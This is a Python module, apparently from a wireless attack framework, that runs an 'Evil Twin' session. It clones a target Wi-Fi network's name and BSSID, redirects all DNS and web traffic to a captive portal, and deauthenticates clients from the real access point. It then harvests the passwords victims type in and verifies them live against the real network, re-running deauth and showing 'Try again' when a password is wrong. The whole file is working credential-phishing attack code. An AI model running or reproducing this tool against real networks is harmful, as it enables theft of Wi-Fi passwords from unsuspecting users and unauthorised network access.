#!/usr/bin/env python3
"""Evil Twin session: hostapd + dnsmasq + isolated portal + optional RF deauth."""
import os
import re
import subprocess
import threading
import time
import uuid
from pathlib import Path
from typing import Callable, Optional

from snakefw.core.ap_support import (
    explain_hostapd_failure,
    hostapd_ap_mode_failed,
    hostapd_channel_failed,
    hw_mode_for,
    plan_ap_channel,
    quiet_networkmanager_on,
    restore_networkmanager_on,
)
from snakefw.core.paths import LOGS_DIR, ensure_runtime_dirs
from snakefw.core.tool_manager import (
    ProcessRunner,
    find_executable,
    get_interface_mode,
    get_interface_phy,
    get_interfaces,
    is_valid_bssid,
    normalize_bssid,
    set_managed_mode,
)
from snakefw.eviltwin.portal import PortalServer
from snakefw.rf.engine import RFSession, RF_DEAUTH, rf_tool_ready

ensure_runtime_dirs()

AP_ADDR = "10.0.0.1"
AP_PREFIX = 24
DHCP_START = "10.0.0.10"
DHCP_END = "10.0.0.200"
CHAIN = "SNAKE_TWIN"

_active_lock = threading.Lock()
_active_session = None


def twin_busy_ifaces() -> set:
    with _active_lock:
        session = _active_session
    if not session or not session.running:
        return set()
    busy = {session.ap_iface}
    if session.deauth_iface:
        busy.add(session.deauth_iface)
    if session.verify_iface:
        busy.add(session.verify_iface)
    return {name for name in busy if name}


def _run(cmd: list, timeout: int = 10) -> subprocess.CompletedProcess:
    return subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)


def _iface_mac(iface: str) -> str:
    path = Path(f"/sys/class/net/{iface}/address")
    try:
        return path.read_text(encoding="utf-8").strip().upper()
    except OSError:
        return ""


def _read_forward() -> str:
    try:
        return Path("/proc/sys/net/ipv4/ip_forward").read_text(encoding="utf-8").strip()
    except OSError:
        return "0"


def _write_forward(value: str):
    try:
        Path("/proc/sys/net/ipv4/ip_forward").write_text(f"{value}\n", encoding="utf-8")
    except OSError:
        pass


class HostapdChannelError(RuntimeError):
    """hostapd rejected the configured channel (NO-IR / missing AP freq)."""


def write_hostapd_conf(
    path: Path,
    iface: str,
    essid: str,
    channel: int,
    country: str = "",
) -> Path:
    lines = [
        f"interface={iface}",
        "driver=nl80211",
        f"ssid={essid}",
        f"hw_mode={hw_mode_for(channel)}",
        f"channel={channel}",
        "beacon_int=100",
        "dtim_period=2",
        "ieee80211n=0",
        "wmm_enabled=0",
        "ignore_broadcast_ssid=0",
        "auth_algs=1",
        "wpa=0",
        "disassoc_low_ack=0",
        "skip_inactivity_poll=1",
        "ap_max_inactivity=300",
    ]
    code = (country or "").strip().upper()
    if len(code) == 2 and code != "00":
        lines.append(f"country_code={code}")
        lines.append("ieee80211d=1")
    path.write_text("\n".join(lines) + "\n", encoding="utf-8")
    return path


def write_dnsmasq_conf(path: Path, iface: str, ap_ip: str, lease_path: Optional[Path] = None) -> Path:
    lease = Path(lease_path) if lease_path else path.with_name("dnsmasq.leases")
    body = (
        f"interface={iface}\n"
        "bind-interfaces\n"
        "dhcp-authoritative\n"
        f"dhcp-range={DHCP_START},{DHCP_END},12h\n"
        f"dhcp-option=3,{ap_ip}\n"
        f"dhcp-option=6,{ap_ip}\n"
        f"dhcp-option=114,http://{ap_ip}/\n"
        f"dhcp-leasefile={lease}\n"
        f"address=/#/{ap_ip}\n"
        "no-resolv\n"
        "log-dhcp\n"
    )
    path.write_text(body, encoding="utf-8")
    return path


def claim_ap_iface(iface: str, log: Optional[Callable] = None) -> dict:
    """Keep NetworkManager and power-save off the Twin AP radio."""
    def _note(msg: str):
        if log:
            log(msg.replace("[radio]", "[Twin]", 1) if msg.startswith("[radio]") else msg)

    return quiet_networkmanager_on(iface, _note)


def release_ap_iface(state: Optional[dict], log: Optional[Callable] = None):
    """Hand the AP radio back to NetworkManager after Twin stops."""
    def _note(msg: str):
        if log:
            log(msg.replace("[radio]", "[Twin]", 1) if msg.startswith("[radio]") else msg)

    restore_networkmanager_on(state, _note)


def write_wpa_conf(path: Path, essid: str, password: str) -> Path:
    safe_essid = essid.replace("\\", "\\\\").replace('"', '\\"')
    safe_psk = password.replace("\\", "\\\\").replace('"', '\\"')
    body = (
        "ctrl_interface=DIR=/tmp/snake_wpa GROUP=root\n"
        "update_config=0\n"
        "network={\n"
        f'    ssid="{safe_essid}"\n'
        f'    psk="{safe_psk}"\n'
        "    key_mgmt=WPA-PSK\n"
        "}\n"
    )
    path.write_text(body, encoding="utf-8")
    return path


def parse_station_dump(output: str) -> list:
    clients = []
    current = {}
    for line in (output or "").splitlines():
        station = re.match(r"Station\s+([0-9A-Fa-f:]{17})", line)
        if station:
            if current:
                clients.append(current)
            current = {"mac": station.group(1).upper(), "signal": 0}
            continue
        signal = re.search(r"signal:\s*(-?\d+)", line)
        if signal and current:
            current["signal"] = int(signal.group(1))
    if current:
        clients.append(current)
    return clients


def verify_psk(iface: str, essid: str, password: str, work_dir: Path, timeout: int = 12) -> bool:
    """Try a short association on a spare managed interface. Returns True on connect."""
    wpa = find_executable("wpa_supplicant")
    if not wpa or not iface:
        return False
    conf = write_wpa_conf(work_dir / "wpa_verify.conf", essid, password)
    cmd = [wpa, "-i", iface, "-c", str(conf), "-P", str(work_dir / "wpa.pid")]
    proc = subprocess.Popen(
        cmd,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        start_new_session=True,
    )
    deadline = time.time() + timeout
    output = []
    try:
        while time.time() < deadline:
            if proc.poll() is not None:
                break
            line = proc.stdout.readline() if proc.stdout else ""
            if not line:
                time.sleep(0.2)
                continue
            output.append(line)
            if "CTRL-EVENT-CONNECTED" in line:
                return True
            if "WRONG-KEY" in line or "4-Way Handshake failed" in line:
                return False
            if "SSID-TEMP-DISABLED" in line:
                return False
        return False
    finally:
        if proc.poll() is None:
            try:
                os.killpg(proc.pid, 15)
            except (ProcessLookupError, PermissionError, OSError):
                proc.terminate()
            try:
                proc.wait(timeout=3)
            except Exception:
                proc.kill()


class EvilTwinSession:
    def __init__(
        self,
        essid: str,
        bssid: str,
        channel: int,
        ap_iface: str,
        *,
        deauth_iface: str = "",
        verify_iface: str = "",
        encryption: str = "",
        stealth: bool = False,
        rotate_mac: bool = False,
        on_log: Optional[Callable] = None,
        on_cred: Optional[Callable] = None,
        on_client: Optional[Callable] = None,
    ):
        self.session_id = str(uuid.uuid4())[:8]
        self.essid = essid
        self.bssid = normalize_bssid(bssid) if bssid else ""
        self.channel = channel
        self.requested_channel = channel
        self.ap_plan = {}
        self.ap_iface = ap_iface
        self.deauth_iface = deauth_iface
        self.verify_iface = verify_iface
        self.encryption = encryption
        self.stealth = stealth
        self.rotate_mac = rotate_mac
        self.on_log = on_log
        self.on_cred = on_cred
        self.on_client = on_client
        self.ap_ip = AP_ADDR
        self.work_dir = LOGS_DIR / f"twin_{self.session_id}"
        self.work_dir.mkdir(parents=True, exist_ok=True)
        self.running = False
        self.started_at = 0.0
        self.deauth_enabled = False
        self.error = ""
        self.original_mac = ""
        self.previous_forward = "0"
        self.iptables_ready = False
        self.hostapd: Optional[ProcessRunner] = None
        self.dnsmasq: Optional[ProcessRunner] = None
        self.portal: Optional[PortalServer] = None
        self.rf: Optional[RFSession] = None
        self.clients = []
        self.creds = []
        self.portal_hits = 0
        self._poll = False
        self._poll_thread = None
        self._lock = threading.Lock()
        self._claim = {}
        self._disabled_reclaims = 0

    def _log(self, msg: str):
        if self.on_log:
            self.on_log(msg)

    def snapshot(self) -> dict:
        with self._lock:
            creds = list(self.creds)
            clients = list(self.clients)
            hits = self.portal_hits
            if self.portal:
                hits = self.portal.state.hits
        return {
            "session_id": self.session_id,
            "essid": self.essid,
            "bssid": self.bssid,
            "channel": self.channel,
            "requested_channel": self.requested_channel,
            "ap_plan": dict(self.ap_plan or {}),
            "ap_iface": self.ap_iface,
            "deauth_iface": self.deauth_iface,
            "verify_iface": self.verify_iface,
            "ap_ip": self.ap_ip,
            "running": self.running,
            "deauth_enabled": self.deauth_enabled,
            "started_at": self.started_at,
            "uptime": int(time.time() - self.started_at) if self.started_at else 0,
            "clients": clients,
            "client_count": len(clients),
            "creds": creds,
            "cred_count": len(creds),
            "portal_hits": hits,
            "error": self.error,
        }

    def start(self):
        global _active_session
        if os.geteuid() != 0:
            raise RuntimeError("Evil Twin requires root")
        if not find_executable("hostapd"):
            raise RuntimeError("hostapd is not installed")
        if not find_executable("dnsmasq"):
            raise RuntimeError("dnsmasq is not installed")
        if self.deauth_iface and self.deauth_iface == self.ap_iface:
            raise RuntimeError("AP and deauth interfaces must be different")
        if self.bssid and not is_valid_bssid(self.bssid):
            raise RuntimeError("Invalid target BSSID")

        self._log(f"[Twin] preparing {self.essid} on {self.ap_iface} ch{self.channel}")
        self._ensure_ap_managed()
        self._claim = claim_ap_iface(self.ap_iface, self._log)
        self._select_ap_channel()
        self._prepare_ap_iface()
        if not self._claim.get("nm_unmanaged"):
            self._claim = claim_ap_iface(self.ap_iface, self._log)
        self._apply_nat()
        self._start_services()
        if self.deauth_iface and rf_tool_ready(RF_DEAUTH) and self.bssid:
            self._start_deauth()
        elif self.deauth_iface:
            self._log("[Twin] deauth interface set but no RF tool is ready")
        else:
            self._log("[Twin] single radio — AP only, live deauth disabled")

        self.running = True
        self.started_at = time.time()
        self._poll = True
        self._poll_thread = threading.Thread(target=self._poll_clients, daemon=True)
        self._poll_thread.start()
        with _active_lock:
            _active_session = self
        self._log(f"[Twin] portal at http://{self.ap_ip}/")

    def _ensure_ap_managed(self):
        """hostapd needs a managed/AP radio. Convert leftover monitor vifs on the same phy."""
        phy = get_interface_phy(self.ap_iface)
        if self.deauth_iface and phy and get_interface_phy(self.deauth_iface) == phy:
            self._log(f"[Twin] {self.deauth_iface} is the same radio as {self.ap_iface} — deauth disabled")
            self.deauth_iface = ""

        sibling = ""
        for name in get_interfaces():
            if name == self.ap_iface:
                continue
            if phy and get_interface_phy(name) == phy and get_interface_mode(name) == "monitor":
                sibling = name
                break

        if sibling:
            self._log(f"[Twin] {sibling} is monitor on the same radio — restoring managed for hostapd")
            restored = set_managed_mode(
                sibling, callback=self._log, restart_networkmanager=False
            )
            if restored:
                self.ap_iface = restored
            return

        if get_interface_mode(self.ap_iface) == "monitor":
            self._log(f"[Twin] {self.ap_iface} is monitor — switching to managed for the Twin AP")
            restored = set_managed_mode(
                self.ap_iface, callback=self._log, restart_networkmanager=False
            )
            if not restored:
                raise RuntimeError(f"Could not switch {self.ap_iface} to managed mode for hostapd")
            self.ap_iface = restored

    def _select_ap_channel(self):
        plan = plan_ap_channel(self.ap_iface, self.requested_channel or self.channel)
        self.ap_plan = plan
        chosen = int(plan.get("channel") or 0)
        if not chosen:
            raise RuntimeError(plan.get("note") or "No AP-capable channel on this radio")
        if plan.get("note"):
            self._log(f"[Twin] {plan['note']}")
        if chosen != self.channel:
            self._log(
                f"[Twin] AP channel {self.channel} → {chosen} "
                f"(hw_mode={plan.get('hw_mode')})"
            )
        self.channel = chosen

    def _prepare_ap_iface(self):
        self.original_mac = _iface_mac(self.ap_iface)
        _run(["ip", "link", "set", self.ap_iface, "down"])
        if self.bssid:
            mac = _run(["ip", "link", "set", self.ap_iface, "address", self.bssid])
            if mac.returncode != 0:
                self._log("[Twin] could not spoof AP MAC; continuing with adapter MAC")
        _run(["ip", "addr", "flush", "dev", self.ap_iface])
        add = _run(["ip", "addr", "add", f"{self.ap_ip}/{AP_PREFIX}", "dev", self.ap_iface])
        if add.returncode != 0:
            raise RuntimeError(f"Could not assign {self.ap_ip} on {self.ap_iface}")
        _run(["ip", "link", "set", self.ap_iface, "up"])

    def _apply_nat(self):
        self.previous_forward = _read_forward()
        _write_forward("1")
        _run(["iptables", "-t", "nat", "-N", CHAIN])
        _run(["iptables", "-t", "nat", "-F", CHAIN])
        exists = _run(["iptables", "-t", "nat", "-C", "PREROUTING", "-i", self.ap_iface, "-j", CHAIN])
        if exists.returncode != 0:
            _run(["iptables", "-t", "nat", "-A", "PREROUTING", "-i", self.ap_iface, "-j", CHAIN])
        _run([
            "iptables", "-t", "nat", "-A", CHAIN, "-p", "tcp", "--dport", "80",
            "-j", "DNAT", "--to-destination", f"{self.ap_ip}:80",
        ])
        _run([
            "iptables", "-t", "nat", "-A", CHAIN, "-p", "tcp", "--dport", "443",
            "-j", "DNAT", "--to-destination", f"{self.ap_ip}:80",
        ])
        _run([
            "iptables", "-t", "nat", "-A", CHAIN, "-p", "udp", "--dport", "53",
            "-j", "DNAT", "--to-destination", f"{self.ap_ip}:53",
        ])
        _run([
            "iptables", "-t", "nat", "-A", CHAIN, "-p", "tcp", "--dport", "53",
            "-j", "DNAT", "--to-destination", f"{self.ap_ip}:53",
        ])
        self.iptables_ready = True

    def _start_services(self):
        dnsmasq_conf = write_dnsmasq_conf(
            self.work_dir / "dnsmasq.conf",
            self.ap_iface,
            self.ap_ip,
            lease_path=self.work_dir / "dnsmasq.leases",
        )
        self._start_hostapd_with_fallback()
        self.dnsmasq = ProcessRunner(
            [
                find_executable("dnsmasq"),
                "-C", str(dnsmasq_conf),
                "-d",
                "-x", str(self.work_dir / "dnsmasq.pid"),
            ],
            log_file=str(self.work_dir / "dnsmasq.log"),
            callback=self._log,
        ).start()
        self.portal = PortalServer(self.ap_ip, 80, self.essid, on_password=self._handle_password)
        self.portal.start()

    def _hostapd_candidates(self) -> list:
        seen = []
        for channel in [self.channel] + list((self.ap_plan or {}).get("fallbacks") or []):
            try:
                channel = int(channel)
            except (TypeError, ValueError):
                continue
            if channel < 1 or channel in seen:
                continue
            seen.append(channel)
        return seen or [self.channel or 6]

    def _start_hostapd_with_fallback(self):
        hostapd = find_executable("hostapd")
        last_error = ""
        for index, channel in enumerate(self._hostapd_candidates()):
            self.channel = channel
            hostapd_conf = write_hostapd_conf(
                self.work_dir / "hostapd.conf",
                self.ap_iface,
                self.essid,
                channel,
                country=(self.ap_plan or {}).get("country") or "",
            )
            _run(["ip", "link", "set", self.ap_iface, "up"])
            self._log(
                f"[Twin] starting hostapd on {self.ap_iface} ch{channel} "
                f"({hw_mode_for(channel)})"
            )
            self.hostapd = ProcessRunner(
                [hostapd, str(hostapd_conf)],
                log_file=str(self.work_dir / "hostapd.log"),
                callback=self._log,
            ).start()
            try:
                self._wait_hostapd_ready()
                return
            except HostapdChannelError as exc:
                last_error = str(exc)
                self._stop_hostapd()
                remaining = self._hostapd_candidates()[index + 1:]
                if remaining:
                    self._log(
                        f"[Twin] ch{channel} rejected for AP — trying ch{remaining[0]} next"
                    )
                    continue
                raise RuntimeError(last_error) from exc
            except RuntimeError as exc:
                last_error = str(exc)
                output = "\n".join(getattr(self.hostapd, "output", []) or [])
                self._stop_hostapd()
                if hostapd_channel_failed(output):
                    remaining = self._hostapd_candidates()[index + 1:]
                    if remaining:
                        self._log(
                            f"[Twin] ch{channel} failed — trying ch{remaining[0]} next"
                        )
                        continue
                raise
        raise RuntimeError(last_error or "hostapd failed to start — check adapter AP support")

    def _stop_hostapd(self):
        if self.hostapd:
            self.hostapd.kill()
            self.hostapd.wait(timeout=3)
        self.hostapd = None
        time.sleep(0.3)

    def _start_deauth(self):
        if get_interface_mode(self.deauth_iface) != "monitor":
            self._log(f"[Twin] {self.deauth_iface} is not monitor — skipping deauth")
            return
        self.rf = RFSession(
            mode=RF_DEAUTH,
            iface=self.deauth_iface,
            bssid=self.bssid,
            essid=self.essid,
            channel=self.channel,
            duration=0,
            stealth=self.stealth,
            rotate_mac=self.rotate_mac,
            on_log=self._log,
        )
        self.rf.start()
        self.deauth_enabled = True
        self._log(f"[Twin] deauth running on {self.deauth_iface}")

    def _handle_password(self, password: str, client_ip: str) -> dict:
        entry = {
            "id": str(uuid.uuid4())[:8],
            "ts": time.time(),
            "essid": self.essid,
            "bssid": self.bssid,
            "password": password,
            "client_ip": client_ip,
            "verified": False,
            "pending": True,
        }
        enc = (self.encryption or "").upper()
        can_verify = bool(
            self.verify_iface
            and "WPA" in enc
            and "OPN" not in enc
            and "WEP" not in enc
        )
        if can_verify:
            self._log("[Twin] verifying submitted password on spare interface")
            if self.rf:
                self.rf.stop()
                self.deauth_enabled = False
            ok = verify_psk(self.verify_iface, self.essid, password, self.work_dir)
            entry["verified"] = ok
            entry["pending"] = False
            if ok:
                self._log("[Twin] password verified against the real AP")
            else:
                self._log("[Twin] password rejected by the real AP")
                if self.deauth_iface and rf_tool_ready(RF_DEAUTH):
                    self._start_deauth()
        with self._lock:
            self.creds.append(entry)
        if self.on_cred:
            self.on_cred(entry)
        return {
            "ok": True,
            "valid": bool(entry["verified"]),
            "pending": bool(entry["pending"]),
            "error": "" if entry["verified"] or entry["pending"] else "Password was not accepted. Try again.",
        }

    def _wait_hostapd_ready(self, timeout: float = 8.0):
        deadline = time.time() + timeout
        while time.time() < deadline:
            text = "\n".join(self.hostapd.output if self.hostapd else [])
            if "AP-ENABLED" in text:
                self._log(f"[Twin] hostapd AP-ENABLED on ch{self.channel}")
                return
            if hostapd_channel_failed(text):
                raise HostapdChannelError(
                    explain_hostapd_failure(text, self.channel, self.ap_plan)
                )
            if hostapd_ap_mode_failed(text):
                raise RuntimeError(explain_hostapd_failure(text, self.channel, self.ap_plan))
            if not self.hostapd or not self.hostapd.is_running():
                if hostapd_channel_failed(text):
                    raise HostapdChannelError(
                        explain_hostapd_failure(text, self.channel, self.ap_plan)
                    )
                raise RuntimeError(explain_hostapd_failure(text, self.channel, self.ap_plan))
            time.sleep(0.2)
        if self.hostapd and self.hostapd.is_running():
            self._log("[Twin] hostapd is running; AP-ENABLED not seen yet")
            return
        text = "\n".join(self.hostapd.output if self.hostapd else [])
        if hostapd_channel_failed(text):
            raise HostapdChannelError(explain_hostapd_failure(text, self.channel, self.ap_plan))
        raise RuntimeError(explain_hostapd_failure(text, self.channel, self.ap_plan))

    def _reclaim_if_hostapd_disabled(self):
        if not self.hostapd or not self.ap_iface:
            return
        text = "\n".join(self.hostapd.output[-40:])
        disables = text.count("INTERFACE-DISABLED")
        enables = text.count("INTERFACE-ENABLED")
        if disables <= enables or self._disabled_reclaims >= disables:
            return
        self._disabled_reclaims = disables
        self._log("[Twin] hostapd INTERFACE-DISABLED — reclaiming AP from NetworkManager")
        self._claim = claim_ap_iface(self.ap_iface, self._log)
        _run(["ip", "link", "set", self.ap_iface, "up"])

    def _poll_clients(self):
        iw = find_executable("iw")
        while self._poll and self.running:
            self._reclaim_if_hostapd_disabled()
            if iw:
                result = _run(["iw", "dev", self.ap_iface, "station", "dump"], timeout=5)
                clients = parse_station_dump(result.stdout)
                with self._lock:
                    self.clients = clients
                    if self.portal:
                        self.portal_hits = self.portal.state.hits
                if self.on_client:
                    self.on_client(clients)
            time.sleep(3)

    def stop(self):
        global _active_session
        self._poll = False
        self.running = False
        if self.rf:
            self.rf.stop()
            self.deauth_enabled = False
        if self.portal:
            self.portal.stop()
        if self.dnsmasq:
            self.dnsmasq.kill()
        if self.hostapd:
            self.hostapd.kill()
        self._teardown_net()
        with _active_lock:
            if _active_session is self:
                _active_session = None
        self._log("[Twin] stopped and interfaces restored")

    def _teardown_net(self):
        if self.iptables_ready:
            _run(["iptables", "-t", "nat", "-D", "PREROUTING", "-i", self.ap_iface, "-j", CHAIN])
            _run(["iptables", "-t", "nat", "-F", CHAIN])
            _run(["iptables", "-t", "nat", "-X", CHAIN])
            self.iptables_ready = False
        _write_forward(self.previous_forward or "0")
        if self.ap_iface:
            _run(["ip", "addr", "del", f"{self.ap_ip}/{AP_PREFIX}", "dev", self.ap_iface])
            if self.original_mac:
                _run(["ip", "link", "set", self.ap_iface, "down"])
                _run(["ip", "link", "set", self.ap_iface, "address", self.original_mac])
                _run(["ip", "link", "set", self.ap_iface, "up"])
        release_ap_iface(self._claim, self._log)
        self._claim = {}
        if self.ap_iface:
            mode = get_interface_mode(self.ap_iface)
            self._log(
                f"[Twin] {self.ap_iface} is {mode or 'unknown'}. "
                "Use Monitor for scanning, or connect this radio (or Ethernet) for MITM"
            )


def stop_all_twin():
    with _active_lock:
        session = _active_session
    if session:
        session.stop()
